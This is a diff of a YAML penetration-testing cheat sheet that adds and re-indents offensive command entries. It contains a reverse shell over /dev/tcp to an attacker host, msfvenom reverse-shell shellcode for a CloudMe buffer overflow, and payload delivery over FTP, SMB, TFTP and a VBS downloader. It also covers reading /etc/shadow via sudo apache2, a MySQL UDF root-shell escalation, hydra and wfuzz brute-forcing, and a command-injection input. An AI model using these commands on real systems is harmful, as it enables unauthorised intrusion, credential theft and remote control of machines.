@@ -114,74 +114,80 @@ meta:
         powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<targetip>/file.exe','C:\Users\user\Desktop\file.exe')"
         python3 -m pyftpdlib -p 21
         rdesktop <targetip> -r disk:remotedisk=/usr/share/windows-binaries
+
         gzip+xxd:
-        sender:
-          gzip -c < file > file.gz
-          xxd -p file.gz | tr -d '\n' && echo
-        receiver:
-          echo 1f8b...0000 > /tmp/file.gz.hex
-          xxd -p -r < /tmp/file.gz.hex > /tmp/file.gz
-          gunzip -c < /tmp/file.gz > /tmp/file
+          sender:
+            gzip -c < file > file.gz
+            xxd -p file.gz | tr -d '\n' && echo
+          receiver:
+            echo 1f8b...0000 > /tmp/file.gz.hex
+            xxd -p -r < /tmp/file.gz.hex > /tmp/file.gz
+            gunzip -c < /tmp/file.gz > /tmp/file
+
         automate file download via windows ftp client:
-        echo open <targetip> >ftp_commands.txt
-        echo anonymous >>ftp_commands.txt
-        echo whatever >>ftp_commands.txt
-        echo binary >>ftp_commands.txt
-        echo get met8888.exe >>ftp_commands.txt
-        echo bye >>ftp_commands.txt
-        ftp -s:ftp_commands.txt
+          echo open <targetip> >ftp_commands.txt
+          echo anonymous >>ftp_commands.txt
+          echo whatever >>ftp_commands.txt
+          echo binary >>ftp_commands.txt
+          echo get met8888.exe >>ftp_commands.txt
+          echo bye >>ftp_commands.txt
+          ftp -s:ftp_commands.txt
+
         create wget.vbs and download netcat:
-        >C:\Windows\d.vbs
-        echo strUrl = WScript.Arguments.Item(0)  >>C:\Windows\d.vbs
-        echo StrFile = WScript.Arguments.Item(1)  >>C:\Windows\d.vbs
-        echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0  >>C:\Windows\d.vbs
-        echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0  >>C:\Windows\d.vbs
-        echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1  >>C:\Windows\d.vbs
-        echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2  >>C:\Windows\d.vbs
-        echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts  >>C:\Windows\d.vbs
-        echo Err.Clear  >>C:\Windows\d.vbs
-        echo Set http = Nothing  >>C:\Windows\d.vbs
-        echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1")  >>C:\Windows\d.vbs
-        echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")   >>C:\Windows\d.vbs
-        echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")   >>C:\Windows\d.vbs
-        echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")  >>C:\Windows\d.vbs
-        echo http.Open "GET", strURL, False  >>C:\Windows\d.vbs
-        echo http.Send  >>C:\Windows\d.vbs
-        echo varByteArray = http.ResponseBody  >>C:\Windows\d.vbs
-        echo Set http = Nothing  >>C:\Windows\d.vbs
-        echo Set fs = CreateObject("Scripting.FileSystemObject")  >>C:\Windows\d.vbs
-        echo Set ts = fs.CreateTextFile(StrFile, True)  >>C:\Windows\d.vbs
-        echo strData = ""  >>C:\Windows\d.vbs
-        echo strBuffer = ""  >>C:\Windows\d.vbs
-        echo For lngCounter = 0 to UBound(varByteArray)  >>C:\Windows\d.vbs
-        echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))  >>C:\Windows\d.vbs
-        echo Next  >>C:\Windows\d.vbs
-        echo ts.Close >>C:\Windows\d.vbs
-        dir C:\Windows\d.vbs
-        C:\Windows\d.vbs "http://<targetip>/nc.exe" C:\Windows\nc.exe
+          >C:\Windows\d.vbs
+          echo strUrl = WScript.Arguments.Item(0)  >>C:\Windows\d.vbs
+          echo StrFile = WScript.Arguments.Item(1)  >>C:\Windows\d.vbs
+          echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0  >>C:\Windows\d.vbs
+          echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0  >>C:\Windows\d.vbs
+          echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1  >>C:\Windows\d.vbs
+          echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2  >>C:\Windows\d.vbs
+          echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts  >>C:\Windows\d.vbs
+          echo Err.Clear  >>C:\Windows\d.vbs
+          echo Set http = Nothing  >>C:\Windows\d.vbs
+          echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1")  >>C:\Windows\d.vbs
+          echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")   >>C:\Windows\d.vbs
+          echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")   >>C:\Windows\d.vbs
+          echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")  >>C:\Windows\d.vbs
+          echo http.Open "GET", strURL, False  >>C:\Windows\d.vbs
+          echo http.Send  >>C:\Windows\d.vbs
+          echo varByteArray = http.ResponseBody  >>C:\Windows\d.vbs
+          echo Set http = Nothing  >>C:\Windows\d.vbs
+          echo Set fs = CreateObject("Scripting.FileSystemObject")  >>C:\Windows\d.vbs
+          echo Set ts = fs.CreateTextFile(StrFile, True)  >>C:\Windows\d.vbs
+          echo strData = ""  >>C:\Windows\d.vbs
+          echo strBuffer = ""  >>C:\Windows\d.vbs
+          echo For lngCounter = 0 to UBound(varByteArray)  >>C:\Windows\d.vbs
+          echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))  >>C:\Windows\d.vbs
+          echo Next  >>C:\Windows\d.vbs
+          echo ts.Close >>C:\Windows\d.vbs
+          dir C:\Windows\d.vbs
+          C:\Windows\d.vbs "http://<targetip>/nc.exe" C:\Windows\nc.exe
+
         netcat:
-        nc -w3 <targetip> 1234 <file.sent
-        cmd /c nc.exe -l -v -p 1234 >file.rcvd
+          nc -w3 <targetip> 1234 <file.sent
+          cmd /c nc.exe -l -v -p 1234 >file.rcvd
+
         smb (139/tcp, 445/tcp):
-        server: python smbserver.py -smb2support shared $HOME/toolbox/scripts/shared
-          copy ntlm/lm hashes submitted by windows clients during transfers and crack via jtr/hashcat
-        client:
-          list files: smbclient -L <targetip> --no-pass
-          list files: net view \\<targetip>
-          list files: dir \\<targetip>\shared
-          copy files: copy \\<targetip>\shared\met8888.exe
-          execute files: \\<targetip>\shared\met8888.exe
+          server: python smbserver.py -smb2support shared $HOME/toolbox/scripts/shared
+            copy ntlm/lm hashes submitted by windows clients during transfers and crack via jtr/hashcat
+          client:
+            list files: smbclient -L <targetip> --no-pass
+            list files: net view \\<targetip>
+            list files: dir \\<targetip>\shared
+            copy files: copy \\<targetip>\shared\met8888.exe
+            execute files: \\<targetip>\shared\met8888.exe
+
         tftp (69/udp):
-        server:
-          atftpd --daemon --port 69 $HOME/toolbox/scripts/shared
-          metasploit:
-            use auxiliary/server/tftp
-            set TFTPROOT $HOME/toolbox/scripts/shared
-            exploit
-        client:
-          download: tftp -i <targetip> GET met8888.exe
-          upload: tftp -i <targetip> PUT hashes.txt
-          install: pkgmgr /iu:"TFTP"
+          server:
+            atftpd --daemon --port 69 $HOME/toolbox/scripts/shared
+            metasploit:
+              use auxiliary/server/tftp
+              set TFTPROOT $HOME/toolbox/scripts/shared
+              exploit
+          client:
+            download: tftp -i <targetip> GET met8888.exe
+            upload: tftp -i <targetip> PUT hashes.txt
+            install: pkgmgr /iu:"TFTP"
     - description: heartbleed
       cli: |
         nmap --script=ssl-heartbleed -p <targetport> <targetip>
@@ -261,6 +267,8 @@ meta:
       cli: |
         socat tcp-listen:8080,fork,reuseaddr tcp:127.0.0.1:80 &
         socat tcp-listen:8065,fork,reuseaddr tcp:127.0.0.1:65334 &
+
+        plink.exe -v -x -a -T -C -noagent -ssh -pw "<localpassword>" -R <targetport>:127.0.0.1:<targetport> <localuser>@<attackerip>
     - description: portknock
       cli: |
         knock once on port 8080/tcp:
@@ -323,38 +331,38 @@ meta:
             https://www.exploit-db.com/exploits/5092
           service:
             manual:
-            find services running as root:
-              $ ps aux | grep "^root"
-            find program version:
-              $ <program> --version
-              $ <program> -v
-              $ dpkg -l | grep <program>
-              $ rpm -qa | grep <program>
+              find services running as root:
+                $ ps aux | grep "^root"
+              find program version:
+                $ <program> --version
+                $ <program> -v
+                $ dpkg -l | grep <program>
+                $ rpm -qa | grep <program>
             apache2:
-            sudo -l => shows apache2 can be run as sudo
-            sudo apache2 -f /etc/shadow => will throw an error upon reading the first line of shadow file and dump hash on stdout, copy it to a file
-            john --format=crypt --wordlist=/usr/share/wordlists/nmap.lst hash
+              sudo -l => shows apache2 can be run as sudo
+              sudo apache2 -f /etc/shadow => will throw an error upon reading the first line of shadow file and dump hash on stdout, copy it to a file
+              john --format=crypt --wordlist=/usr/share/wordlists/nmap.lst hash
             exim:
-            dpkg -l | grep -i exim => version <4.86.2
-            exim -bV -v | grep -i perl => compiled with perl support
-            head /etc/exim.conf => configuration has perl_startup option
-            ./cve_2016-1521.sh
+              dpkg -l | grep -i exim => version <4.86.2
+              exim -bV -v | grep -i perl => compiled with perl support
+              head /etc/exim.conf => configuration has perl_startup option
+              ./cve_2016-1521.sh
             lxd:
-            check output of id command
-            if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
+              check output of id command
+              if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
             mysqld:
-            when mysql is running as root
-            mysql has ability to install uder defined functions which run via shared objects
-            use [edb:1518](https://www.exploit-db.com/exploits/1518)
-            once exploit is complete, do the following:
-              mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod+s /tmp/rootbash');
-              mysql> exit
-              $ /tmp/rootbash -p
-              rootbash-4.1# id
-                uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+              when mysql is running as root
+              mysql has ability to install uder defined functions which run via shared objects
+              use [edb:1518](https://www.exploit-db.com/exploits/1518)
+              once exploit is complete, do the following:
+                mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod+s /tmp/rootbash');
+                mysql> exit
+                $ /tmp/rootbash -p
+                rootbash-4.1# id
+                  uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
             strace:
-            https://gtfobins.github.io/gtfobins/strace/
-            write a c program to run bin/bash and strace it: https://hackso.me/lin.security-1-walkthrough/
+              https://gtfobins.github.io/gtfobins/strace/
+              write a c program to run bin/bash and strace it: https://hackso.me/lin.security-1-walkthrough/
             udev:
             netlink:
                 https://www.exploit-db.com/exploits/8478
@@ -362,8 +370,8 @@ meta:
                 cat /proc/net/netlink
                 select pid for group "ffffffff"
             port forwarding:
-            if the root process is bound to an internal port and for some reason we cannot run the exploit locally, use port forwarding via ssh:
-            $ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
+              if the root process is bound to an internal port and for some reason we cannot run the exploit locally, use port forwarding via ssh:
+              $ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
           weak file permissions:
             important commands:
             $ find /etc -maxdepth 1 -writable -type f
@@ -874,7 +882,7 @@ meta:
     - description: ncrack
       cli: |
         bruteforce rdp login:
-        ncrack -vv --user administrator -P passwords.txt rdp://<targetip>
+          ncrack -vv --user administrator -P passwords.txt rdp://<targetip>
     - description: netdiscover
       cli: |
         netdiscover -r 192.168.92.0/24
@@ -885,22 +893,22 @@ meta:
     - description: nmap
       cli: |
         vulners nse script:
-        https://github.com/vulnersCom/nmap-vulners
+          https://github.com/vulnersCom/nmap-vulners
         searchsploit-like vuln scan:
-        nmap --script vulners --script-args mincvss=5.0 <targetip>
+          nmap --script vulners --script-args mincvss=5.0 <targetip>
         ping sweep:
-        nmap -sn -oN scan.ping.nmap <targetiprange> ; cat scan.ping.nmap | grep Up | cut -d" " -f2
+          nmap -sn -oN scan.ping.nmap <targetiprange> ; cat scan.ping.nmap | grep Up | cut -d" " -f2
         quick tcp:
-        nmap -Pn -n -sC -sV -vv -oN scan.tcp.nmap <targetip>
+          nmap -Pn -n -sC -sV -vv -oN scan.tcp.nmap <targetip>
         quick udp:
-        nmap -Pn -n -sU -sV -vv -oN scan.udp.nmap <targetip>
+          nmap -Pn -n -sU -sV -vv -oN scan.udp.nmap <targetip>
         full/intensive tcp:
-        nmap -Pn -n -sC -sV -p- -vv -oN scan.fulltcp.nmap <targetip>
+          nmap -Pn -n -sC -sV -p- -vv -oN scan.fulltcp.nmap <targetip>
         full/intensive udp:
-        nmap -Pn -n -sU -sV -p- -vv -oN scan.fulltcp.nmap <targetip>
+          nmap -Pn -n -sU -sV -p- -vv -oN scan.fulltcp.nmap <targetip>
         smb bruteforce:
-        nmap --script=smb-brute.nse <targetip>
-        nmap -sV -p 445 --script smb-brute <targetiprange>
+          nmap --script=smb-brute.nse <targetip>
+          nmap -sV -p 445 --script smb-brute <targetiprange>
     - description: openssl
       cli: |
         openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -subj "/CN=root.kali.pwn" --days 7 ## create a new x509 certificate valid for 7 days
@@ -950,19 +958,19 @@ meta:
     - description: wfuzz
       cli: |
         enumerate directories:
-        wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://127.0.0.1/index.php?vuln=../FUZZ/file1.php"
-        wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --sc 200 -t 50 http://192.168.30.129:4480/FUZZ
-        wfuzz -w common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt --sc 200 -t 50 http://192.168.30.129:4488/FUZZ
+          wfuzz -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://127.0.0.1/index.php?vuln=../FUZZ/file1.php"
+          wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --sc 200 -t 50 http://192.168.30.129:4480/FUZZ
+          wfuzz -w common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt --sc 200 -t 50 http://192.168.30.129:4488/FUZZ
         enumerate directories and filter on response length:
-        wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ
+          wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ
         bruteforce password:
-        bruteforce a single list:
-          wfuzz -w pwds.db -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
-        bruteforce multiple lists:
-          wfuzz -w pwds.db -w pins.txt -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
-        bruteforce multiple lists, but faster:
-          wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345' --hh 45 http://192.168.0.74:8080/login.php
-          wfuzz -c -z file,./pin.txt -d 'user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ' --hh 45,41 http://192.168.0.74:8080/login.php
+          bruteforce a single list:
+            wfuzz -w pwds.db -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
+          bruteforce multiple lists:
+            wfuzz -w pwds.db -w pins.txt -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
+          bruteforce multiple lists, but faster:
+            wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345' --hh 45 http://192.168.0.74:8080/login.php
+            wfuzz -c -z file,./pin.txt -d 'user=pinkadmin&pass=AaPinkSecaAdmin4467&pin=FUZZ' --hh 45,41 http://192.168.0.74:8080/login.php
   ttps:
     enumerate:
       enumerate_nmap_initial:
@@ -1323,6 +1331,9 @@ meta:
           gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt -u http://<targetip>:<targetport> -s "200,204,301,307,403,500"
           gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt -u http://<targetip>:<targetport> -s "200,204,301,307,403,500"
           gobuster -w /usr/share/wordlists/SecLists/Discovery/Web_Content/common.txt -u https://<targetip>:<targetport> -s "200,204,301,307,403,500"
+          gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<taregtip>/ -t 20 -U <username> -P <password>
+          hydra -l <username> -P /usr/share/wordlists/rockyou.txt <targetip> http-get /
+          hydra -l <username> -P /usr/share/wordlists/rockyou.txt <targetip> http-head /
           nc -v -n -w1 <targetip> <targetport> ## netcat to grab banner
           nikto -o "[OUTPUT].txt" -p <targetport> -h <targetip>
           nmap -Pn -sV -sC -vvvvv -p<targetport> <targetip> -oA [OUTPUT]
@@ -1640,6 +1651,14 @@ meta:
           bash -i >& /dev/tcp/<attackerip>/<attackerport> 0>&1
         references:
           -
+      exploit_cloudme_bof:
+        description: the CloudMe version 1.11.12 is vulnerable to a buffer overflow that could be used to gain interactive access on the target system, possibly with elevated privileges
+        cli: |
+          msfvenom -p windows/shell_reverse_tcp lhost=<attackerip> lport=<attackerport> -b "\x00\x0a\x0d" -f python -a x86 --platform windows -e x86/shikata_ga_nai
+          sudo nc -nlvp <attackerport>
+          python 48389.py
+        references:
+          - https://www.exploit-db.com/exploits/48389
       exploit_coldfusion_dirtraversal:
         description: coldfusion 8 is vulnerable to a directory traversal and exposes SHA1 hash of the user password
         cli: |
@@ -1662,6 +1681,12 @@ meta:
             http://<targetip>:<targetport>/CFIDE/revshell.jsp
         references:
           - https://medium.com/@_C_3PJoe/htb-retired-box-write-up-arctic-50eccccc560
+      exploit_command_injection:
+        description: certain webapps couldbe vulebrable to command injection via input text fields
+        cli: |
+          # submit escaped input: "\";whoami\n"
+        references:
+          - https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/
       exploit_credsreuse:
         description: Reuse credentials already found for a service to interact with another service
         cli: |
@@ -1700,6 +1725,14 @@ meta:
         references:
           - https://0xrick.github.io/hack-the-box/active/
           - https://adsecurity.org/?p=2288
+      exploit_gymsystem_rce:
+        description: use `/contacts.php` to confirm the version is 1.0 and fire this exploit to get a pseudo-interactive shell on the target machine. you can 
+        cli: |
+          python 48506.py http://<targetip>:<targetport>/
+
+          curl "http://<targetip>:<targetport>/upload/kamehameha.php?telepathy=whoami"
+        references:
+          - https://www.exploit-db.com/exploits/48506
       exploit_hfs_cmd_exec:
         description: HFS (`HttpFileServer 2.3.x`) is vulnerable to remote command execution
         cli: |
@@ -2014,6 +2047,11 @@ meta:
           hydra -l anne -P "/usr/share/wordlists/rockyou.txt" -e nsr -s 22 ssh://<targetip>
         references:
           - 
+      exploit_ssh_privatekeys:
+        description: 
+        cli: |
+        references:
+          - 
       exploit_ssl_heartbleed:
         description: use nmap nse script to confirm heartbleed vulnerability and then sensepost exploit to dump memory from target system
         cli: |
@@ -2111,9 +2149,21 @@ meta:
         cli: |
         references:
           - 
+      privesc_env_relative_path:
+        description: certain files when referenced without their complete path, can be misused to gain elevated privileges. this can be done by modifying the environment path to find the referenced file within a directory under attacker's control and placing a malicious binary within that directory with the same name as the referenced file 
+        cli: |
+        references:
+          - https://muirlandoracle.co.uk/2020/05/30/year-of-the-fox-write-up/
       privesc_freebsd:
         description: 
         cli: |
+        references:
+          - 
+      privesc_lxc_bash:
+        description:
+        cli: |
+          check output of id command
+          if user member of lxd group, follow https://reboare.github.io/lxd/lxd-escape.html
         references:
           - 
       privesc_iis_webconfig:
